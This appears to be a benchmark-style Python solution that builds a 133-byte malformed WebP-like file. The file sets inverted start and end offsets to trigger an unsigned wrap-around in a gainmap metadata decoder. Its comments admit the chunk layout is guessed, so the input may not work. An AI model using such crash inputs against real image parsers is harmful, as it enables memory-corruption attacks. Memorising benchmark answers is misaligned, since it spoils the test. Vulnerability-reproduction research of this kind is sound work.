class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed input to trigger unsigned wrap-around in decodeGainmapMetadata
        # Assuming RIFF-based format like WebP with bad positions for start/end
        poc = b'RIFF\x84\x00\x00\x00WEBPVP8X\x05\x00\x00\x00'  # Flags indicating metadata
        poc += b'\x00' * 10  # VP8X data
        poc += b'GAIN\x10\x00\x00\x00'  # Hypothetical gainmap chunk ID 'GAIN', size 16
        poc += b'\x10\x00\x00\x00'  # start position 16
        poc += b'\x05\x00\x00\x00'  # end position 5 (causes wrap: 5 - 16 = large unsigned)
        poc += b'\x00' * 8  # Padding for metadata
        poc += b'VP8 \x40\x00\x00\x00'  # VP8 chunk with size 64
        poc += b'\x00' * 64  # Dummy VP8 data
        poc += b'\x00' * (133 - len(poc))  # Pad to 133 bytes
        return poc
